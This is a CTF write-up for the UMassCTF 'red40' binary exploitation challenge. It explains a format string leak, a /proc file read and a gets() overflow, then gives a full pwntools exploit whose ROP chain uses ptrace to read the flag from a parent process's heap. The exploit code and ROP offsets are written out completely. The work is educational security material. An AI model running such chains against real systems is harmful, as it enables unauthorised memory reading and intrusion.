---
description: PTRACE
---

# UMassCTF

{% hint style="info" %}
Participated under the banner of <mark style="color:blue;">**HCS**</mark>, ranked <mark style="color:yellow;">66</mark> out of <mark style="color:yellow;">417</mark> teams.
{% endhint %}

<table><thead><tr><th width="149">Challenge</th><th width="175">Category</th></tr></thead><tbody><tr><td>red40</td><td>Binary Exploitation</td></tr></tbody></table>

## red40

### Description

> I heard you like RED40

### Binary Analysis

We're given attachments as follows:

```bash
└──╼ [★]$ tree .
.
├── Dockerfile
├── entrypoint.sh
├── libc
│   ├── ld-linux-x86-64.so.2
│   └── libc.so.6
├── main.c
├── Makefile
├── nsjail.cfg
├── parent
├── parent.c
├── red40
└── run.sh

└──╼ [★]$ pwn checksec parent red40 
[*] '/home/halcyon/git/CTFs/2024/UMass/red40/parent'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./libc'
[*] '/home/halcyon/git/CTFs/2024/UMass/red40/red40'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./libc'
```

notice we have 2 binary here, looking at the entrypoint:

{% code title="entrypoint.sh" %}
```bash
echo 0 | tee /proc/sys/kernel/yama/ptrace_scope > /dev/null

/opt/red40/parent
```
{% endcode %}

we see that `parent` is the interface we're interacting with.

looking at its main function, it will try to run `fork()` seemingly to randomize the PID of the forked process, and then finally running the `forker()` function.

{% code title="parent.c" %}
```c
int main(int argc, char *argv[])
{
    setup();

    int r = rand() % (500 + 100);
    for (int i = 0; i < r; i++)
    {
        int pid = fork();
        if (pid == 0)
        {
        }
        else
        {
            kill(pid, SIGKILL);
            waitpid(pid, NULL, 0);
        }
    }

    if (argc == 2)
    {
        if (!strncmp(argv[1], "fork", 4))
            forker();
    }
    else
    {
      // snippet
    }
}
```
{% endcode %}

`forker()` then will create a new process using the `red40` binary and allocate the flag inside of `parent`'s heap memory

{% code title="parent.c " %}
```c
void forker()
{
    int pid = fork();
    if (pid == 0)
    {
        char *nargv[] = {"red40", "loop", (char *)0};
        char *nenv[] = {NULL};
        execve("red40", nargv, NULL);
    }
    else
    {
        char *flag = malloc(0x30);

        strncpy(flag, "UMASS{TEST_FLAG}", 0x30);
        waitpid(pid, NULL, 0);
    }
}
```
{% endcode %}

in `red40` there's a seccomp filter that is being applied:

```c
void setupv2()
{
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);
	seccomp_rule_add(ctx, SCMP_ACT_KILL_PROCESS, SCMP_SYS(execve), 0);
	seccomp_rule_add(ctx, SCMP_ACT_KILL_PROCESS, SCMP_SYS(execveat), 0);
	seccomp_rule_add(ctx, SCMP_ACT_KILL_PROCESS, SCMP_SYS(socket), 0);
	seccomp_load(ctx);
}
```

we can also dump the filter using `seccomp-tools` and it shows the same result:

```bash
└──╼ [★]$ seccomp-tools dump "./red40 loop"
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000029  if (A == socket) goto 0009
 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009
 0007: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

upon running `red40` we're greeted with a few options:

```bash
└──╼ [★]$ ./red40 loop
What would you like to do with your RED40?
1. Appreciate RED40
2. Gamble RED40
3. Warn RED40
4. Consume RED40
5. STEAL RED40
6. Exit (no RED40 for you)

>
```

the first option simply prints the `RED40` global variable

{% code title="main.c" %}
```c
void appreciate()
{
	printf("You are now appreciating your %d RED40!\n", RED40);
}
```
{% endcode %}

the second option is a literal gamble lol

{% code title="main.c" %}
```c
void gamble()
{
	puts("ITS TIME TO GAMBLE RED40!!!");

	int r;
	char again[2];

	while (1)
	{
		puts("Are you ready to gamble??? (\"99.9999999% of gamblers quit right before winning big...\" - Royce du Pont) (Y)");
		printf("\n> ");

		read(0, again, 2);
		again[1] = '\0';

		if (strncmp(again, "Y\0", sizeof(again)))
			break;

		r = rand() % (40 + 1);

		if (r == 40)
		{
			puts("YOU WON!!! (KEEP GAMBLING FOR MORE RED40)");
			RED40 = getppid();
			break;
		}
		RED40--;

		printf("\nGambling... YOU LOST. You have %d RED40 remaining\n", RED40);
		puts("I'm a winner see my prize, you're a loser who sits and cries");
	}
}

```
{% endcode %}

however if we won the gample we will receive the parent's PID and can leak it using the aforemention `appreciate()` function.

the third option, enables a format string and buffer overflow vulnerability:

{% code title="main.c" %}
```c
void warn_get()
{
	int c, i = 0;
	char red[0x20];
	memset(red, 0x0, 0x20);

	printf("How will you warn the RED40?\n>\n");
	while ((c = fgetc(stdin)) != '\n' && c != EOF && i < 12)
		red[i++] = c;

	printf(red);

	printf("\nDO YOU HAVE ANYTHING ELSE TO SAY TO THE RED40?????\n> ");

	gets(red);

	if (WARN)
	{
		puts("YOU HAVE BEEN CAUGHT!!! NO MORE WARNING RED40!!!");
		exit(0);
	}
	else
		WARN = 1;
}
```
{% endcode %}

I never used the fourth option and so I will skip it as it is lack of relevancy.

the fifth option enables a LFI once, allowing us to read files from the machine but with some limitation like, only 3 `/` are allowed among others.

{% code title="main.c" %}
```c
void steal()
{
	if (STEAL)
	{
		// exit
	}
	else
		STEAL = 1;

	int c, fd = 0;
	char b;
	char red[0x20];

	// snippet
	fgets(red, sizeof(red), stdin);
	red[strnlen(red, sizeof(red)) - 1] = '\0';

	char *red_r = malloc(0x20);
	strncpy(red_r, red, 0x20);

	int count = 0;
	const char delim[] = "/";
	char *last_token = NULL;
	char *token = strtok(red, delim);

	while (token != NULL)
	{
		if (count > 3)
		{
			// exit
		}
		last_token = token;
		token = strtok(NULL, delim);

		if (count == 0)
		{
			if (strnlen(last_token, strlen(red)) != 4)
			{
				// exit
			}
		}
		else if (count == 2)
		{
			if (strnlen(last_token, strlen(red)) < 4)
			{
				// exit
			}
		}

		count++;
	}

	printf("Count: %d\n", count);
	if (count != 3)
	{
		// exit
	}

	fd = open(red_r, O_RDONLY);
	while (read(fd, &b, 1) == 1)
		putchar(b);
	// snippet
}
```
{% endcode %}

### Exploitation

{% hint style="info" %}
my exploit is not the easiest to do, but I'm glad I gone through this path because in the end I'm touching a new subject and learning more



more on the cheesy solution at the end.&#x20;
{% endhint %}

#### Threading Shenanigans

in a threaded environment such as this, it would be pain to debug. from this link:

{% embed url="https://github.com/Naetw/CTF-pwn-tips?tab=readme-ov-file#fork-problem-in-gdb" %}

we can set the breakpoint before the call to `fork()`, and run `set follow-fork-mode child` in GDB which is part of the thread that will eventually spawn the new process. this will enables us to examine the new process memory (i.e. `red40`) and debug our payload.&#x20;

#### Parent Process Memory Leak

since our flag is located inside of the parent's process memory, we obviously need to leak the parent's address heap memory to read. this can be done by:

first leaking the parent's PID by gambling:

```python
# ==================
# GET PARENT PID
# ==================
io.sendlineafter(b'>', b'2')
while(io.recvline().strip()[:7] != b'YOU WON'): # literal gamble
    io.sendlineafter(b'>', b'Y')

io.sendlineafter(b'>', b'1')
io.recvuntil(b'You are now appreciating your ')
PPID = int(io.recvuntil(b' RED40', drop=True))
```

and then leveraging LFI to read its memory mapping:

```python
# ==================
# READ PARENT VMMAP
# ==================
io.sendlineafter(b'>', b'5')
io.sendlineafter(b'>', f'/proc/{PPID}/maps'.encode())

io.recvline()
io.recvlines(5) # remote
heap = int(io.recvuntil(b'-', drop=True), 16)
flag_heap = heap + 0x290 + 0x10 # offset gained through gdb 
```

but then now what?&#x20;

#### Understanding PTRACE

the flag is in the parent's memory but we're interacting with the child's memory, and there's no way for the child to examine or read from another process memory... right?

and so I did a bit of googling using that exact keyword, and found this:

{% embed url="https://stackoverflow.com/questions/2216035/ptraceing-of-parent-process" %}

the example code given in that link somewhat seems very similar to the challenge we're facing. so what exactly is `PTRACE`?

reading from the man page:

{% embed url="https://man7.org/linux/man-pages/man2/ptrace.2.html" %}

> The ptrace() system call provides a means by which one process(the "tracer") may observe and control the execution of another process (the "tracee"), and examine and change the tracee's memory and registers. It is primarily used to implement breakpoint debugging and system call tracing.

so its a system call to examine another process memory and execution, exactly what gdb and other debugger uses. and this is exactly what we wanted

but me myself is still quite blind in terms of how to use the syscall properly, so to google I return once more and found this article that demonstrate how to use `PTRACE`:

{% embed url="https://www.linuxjournal.com/article/6210" %}

I highly recommend you to read it to fully understand but to summarise, there's 3 stages to `PTRACE`:&#x20;

1. first, is to attach the current process to the process we wish to ptrace\
   `ptrace(PTRACE_ATTACH, <PID>, NULL, NULL);`
2. second, we perform operations to the attached process such as reading and writing to it
3. once we're done, we detach from it\
   `ptrace(PTRACE_DETACH, <PID>, NULL, NULL);`&#x20;

there's numbers of operations that can be done, the full list of them can be seen from the man page linked above, and for the literal macro values can be seen here:

{% embed url="https://sites.uclouvain.be/SystInfo/usr/include/sys/ptrace.h.html" %}

other than the `PTRACE_ATTACH` operation:

{% code overflow="wrap" %}
```c
  /* Attach to a process that is already running. */
  PTRACE_ATTACH = 16,
#define PT_ATTACH PTRACE_ATTACH
```
{% endcode %}

we're also interested in `PTRACE_PEEKDATA`:

{% code overflow="wrap" %}
```c
  /* Return the word in the process's data space at address ADDR.  */
  PTRACE_PEEKDATA = 2,
#define PT_READ_D PTRACE_PEEKDATA
```
{% endcode %}

which we'll be using to read data (the flag) from `parent` .

to confirm this, I wrote this small program to confirm the hypothesis:

{% code title="hotpatch.c" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>
#include <string.h>

int main(int argc, char *argv[])
{
    pid_t pid;
    struct user_regs_struct regs;
    unsigned long ins;
    unsigned long heap;
    char buf[0x40] = {0};

    if (argc != 2) {
        printf("usage: %s [pid]\n", argv[0]);
        return 1;
    }

    pid = atoi(argv[1]);
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    //wait(NULL);
    sleep(1);

    puts("heap base: ");
    scanf("%lx", &heap);
    printf("sanity: %#lx\n", heap);

    long res = ptrace(PTRACE_PEEKDATA, pid, heap + 0x290 + 0x10, 0xffff);
    printf("res: %lx\n", res);
    
    memcpy(buf, &res, 8);

    puts(buf);

    getchar();

    return 0;
}
```
{% endcode %}

{% hint style="info" %}
Here's I used `sleep()` to wait for the attach completes within the kernel side, I tried using `wait(NULL)` just as the aforementioned blog demonstrates but it doesn't work here nor in the ROP payload later below.
{% endhint %}

while running `parent` , I run it and giving it `parent`'s PID and its heap base

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

and as you can see, we're able to read another process memory and leak the flag.

with this mind lets develop the exploit for it, we still have bof and format string that we haven't abused yet.

#### Implementing PTRACE ROP

to do this, we need to be able to control a lot of register to pass the `PTRACE` arguments, however the `red40` binary itself doesn't have an abundance of gadgets.&#x20;

libc in the other hand has practically all of the gadget we need, and thus a leak to libc address will enable us to ROP through the gadget to control the register. we will exploit the format string to leak a libc address.

the binary also have PIE enabled, and thus we also need to leak a writeable address for which it will store the data from `parent` that wanted to be read. I chose the stack as it is easy to leak from the same format string.

```python
io.sendlineafter(b'>', b'3')
io.sendlineafter(b'>', b'%10$p|%41$p')

io.recvline() 
leak = io.recvline().strip().replace(b'0x', b'').split(b'|')
stack = int(leak[0], 16)
libc.address = int(leak[1], 16) - 128 - libc.sym['__libc_start_main']
stack = stack - 0x188
```

&#x20;our ROP payload will be split into three section:

1.  _**Initating PTRACE**_\
    &#x20;          &#x20;

    <pre class="language-python"><code class="lang-python"><strong>    # PTRACE ATTACH
    </strong>    libc.address + 0x45eb0, # pop rax; ret
        PTRACE_NR,
        libc.address + 0x2a3e5, # pop rdi; ret
        PTRACE_ATTACH,
        libc.address + 0x2be51, # pop rsi; ret,
        PPID,
        libc.address + 0x11f2e7, # pop rdx; pop r12; ret,
        0x0,
        0x0,
        libc.sym['ptrace'],
        
        # SLEEP WAIT
        libc.address + 0x2a3e5, # pop rdi; ret
        0x10,
        libc.sym['sleep'],
    </code></pre>

    \
    the sleep to wait is mandatory or else, the subsequent PTRACE operations will returns an error, I can't say for sure how long the duration will be.
2.  _**Reading flag from `parent` and storing it in `red40`**_\
    calling PTRACE with `PTRACE_PEEKDATA` only read 8 bytes (in x64) from the starting memory of which is in RAX. \
    \
    I'm not sure if there's anyway to read more than 8 bytes, but since the we have no length limitation on our ROP payload, because the bof is triggered by `gets()` , I didn't bother to look it up.\
    \
    and so I wrote this function to read 8 bytes and mov the return value to the writeable address in the current process.\


    ```python
    def craft_ptrace_peek_payload(src, dest) -> bytes:
        payload = flat([
                # PTRACE PEEKDATA
                libc.address + 0x45eb0, # pop rax; ret
                PTRACE_NR,
                libc.address + 0x11f2e7,# pop rdx; pop r12; ret,
                src,
                0,
                libc.sym['ptrace'],

                # move PEEK'd data (rax) to destination
                libc.address + 0x11f2e7, # pop rdx; pop r12; ret,
                dest,
                0,
                libc.address + 0x3a411, # mov dword ptr [rdx], eax ; ret
        ]) 
        return payload
            
            # snippet...
            # continuing the rop payload from before
                    
            # RDI AND RSI FOR PEEKDATA
            libc.address + 0x2a3e5, # pop rdi; ret
            PTRACE_PEEKDATA,
            libc.address + 0x2be51, # pop rsi; ret,
            PPID,

    for i in range(0, 40, 4):
            payload += craft_ptrace_peek_payload(flag_heap + i, stack + i)
    ```
3.  _**Writing leaked flag to stdout**_\
    next we just need to write the flag to stdout, I think this is pretty self explanatory, just call the write syscall\


    ```python
            # WRITE
            libc.address + 0x45eb0, # pop rax; ret
            WRITE_NR,
            libc.address + 0x2a3e5, # pop rdi; ret
            STDOUT,
            libc.address + 0x2be51, # pop rsi; ret,
            stack,
            libc.address + 0x11f2e7, # pop rdx; pop r12; ret,
            0x40,
            0x0,
            libc.sym['write'],
    ```

I write this writeup long after the competition had already ended, and didn't take the screenshot of running it againts remote so you have just take my word and it works lol :p

#### Reading Parent memory without PTRACE

there's another way to read to read parent's memory process without requiring to PTRACE, I found this solution in the TCP1P server which if you joined the discord, you can open the writeup here:

{% embed url="https://discord.com/channels/848446674103697461/1230542325273329715/1231808858834600067" %}

in summary:

* `open("/proc/<ppid>/mem", O_RDONLY)`
* `lseek(mem_fd, flag_addr, SEEK_SET)`
* `read(mem_fd, buf, 0x30)`
* `write(1, buf, 0x30)`

#### Cheesy Solution

the cheese to solution to this which I didn't know why I didn't think of this lol, is to just basically read the parent' binary. since the flag is hardcoded, we can read the string at a certain offset using `lseek()`, we can figure out where the binary is located from the dockerfile that they provided.

#### Another awesome PTRACE challenge

Another thing I wanted to note is that the writeup linked below helped me a lot in debugging and understanding while also motivates me to do the exploit the PTRACE way:

{% embed url="https://github.com/nobodyisnobody/write-ups/tree/main/NahamCon.EU.CTF.2022/pwn/limited_resources" %}

the challenge in that writeup is harder and definitely more interesting as it uses PTRACE to patch a process in real time.

Below is the full exploit script:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = '../red40'
elf = context.binary = ELF(exe, checksec=True)
parent = '../parent'
paret = ELF(parent, checksec=False)
libc = '../libc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'red40.ctf.umasscybersec.org', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe, 'loop'] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    elif args.PARENT:
        return process([parent, 'fork'] + argv)
    elif args.HEH:
        return gdb.debug([parent, 'fork'] + argv, gdbscript=gdbscript)
    else:
        return process([exe, 'loop'] + argv)

gdbscript = '''
init-pwndbg
set detach-on-fork off
break *main+155
break *forker+27
break *forker+101 
break *warn_get+213
'''.format(**locals())
# break *warn_get+124

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ seccomp-tools dump "./red40 loop"
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
#  0005: 0x15 0x03 0x00 0x00000029  if (A == socket) goto 0009
#  0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009
#  0007: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0009
#  0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0009: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
#  0010: 0x06 0x00 0x00 0x00000000  return KILL

PTRACE_ATTACH = 16
PTRACE_PEEKDATA = 2
PTRACE_NR = 101
WRITE_NR = 1
STDOUT = 1
PPID = 0 

def craft_ptrace_peek_payload(src, dest) -> bytes:
    payload = flat([
            # PTRACE PEEKDATA
            libc.address + 0x45eb0, # pop rax; ret
            PTRACE_NR,
            libc.address + 0x11f2e7,# pop rdx; pop r12; ret,
            src,
            0,
            libc.sym['ptrace'],

            # move PEEK'd data (rax) to destination
            libc.address + 0x11f2e7, # pop rdx; pop r12; ret,
            dest,
            0,
            libc.address + 0x3a411, # mov dword ptr [rdx], eax ; ret
    ]) 
    return payload

def exploit():
    global io
    io = initialize()
    rop = ROP(libc)

    # ==================
    # GET PARENT PID
    # ==================
    io.sendlineafter(b'>', b'2')
    while(io.recvline().strip()[:7] != b'YOU WON'): # literal gamble
        io.sendlineafter(b'>', b'Y')

    io.sendlineafter(b'>', b'1')
    io.recvuntil(b'You are now appreciating your ')
    PPID = int(io.recvuntil(b' RED40', drop=True))

    # ==================
    # READ PARENT VMMAP
    # ==================
    io.sendlineafter(b'>', b'5')
    io.sendlineafter(b'>', f'/proc/{PPID}/maps'.encode())

    io.recvline()
    io.recvlines(5) # remote
    heap = int(io.recvuntil(b'-', drop=True), 16)
    flag_heap = heap + 0x290 + 0x10
    
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', b'%10$p|%41$p')
    
    io.recvline() 
    leak = io.recvline().strip().replace(b'0x', b'').split(b'|')
    stack = int(leak[0], 16)
    libc.address = int(leak[1], 16) - 128 - libc.sym['__libc_start_main']
    stack = stack - 0x188

    # # ==================
    # # LEAKING FLAG
    # # ==================
    payload = b''
    payload += flat({
        56: [
            # PTRACE ATTACH
            libc.address + 0x45eb0, # pop rax; ret
            PTRACE_NR,
            libc.address + 0x2a3e5, # pop rdi; ret
            PTRACE_ATTACH,
            libc.address + 0x2be51, # pop rsi; ret,
            PPID,
            libc.address + 0x11f2e7, # pop rdx; pop r12; ret,
            0x0,
            0x0,
            libc.sym['ptrace'],

            # SLEEP WAIT
            libc.address + 0x2a3e5, # pop rdi; ret
            0x10,
            libc.sym['sleep'],

            # RDI AND RSI FOR PEEKDATA
            libc.address + 0x2a3e5, # pop rdi; ret
            PTRACE_PEEKDATA,
            libc.address + 0x2be51, # pop rsi; ret,
            PPID,

        ]
    })

    for i in range(0, 40, 4):
        payload += craft_ptrace_peek_payload(flag_heap + i, stack + i)

    payload += flat([
            # WRITE
            libc.address + 0x45eb0, # pop rax; ret
            WRITE_NR,
            libc.address + 0x2a3e5, # pop rdi; ret
            STDOUT,
            libc.address + 0x2be51, # pop rsi; ret,
            stack,
            libc.address + 0x11f2e7, # pop rdx; pop r12; ret,
            0x40,
            0x0,
            libc.sym['write'],
    ])

    io.sendlineafter(b'>', payload)

    log.success('parent heap base: %#x', heap)
    log.success('child stack leak: %#x', stack)
    log.success('child libc base: %#x', libc.address)
    log.success('ppid: %d', PPID)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()
```
{% endcode %}

{% hint style="success" %}
Flag: _**UMASS{r0j0\_4d\_k33p!n6\_y0u\_r1ch\_4$\_h3ck!}**_
{% endhint %}
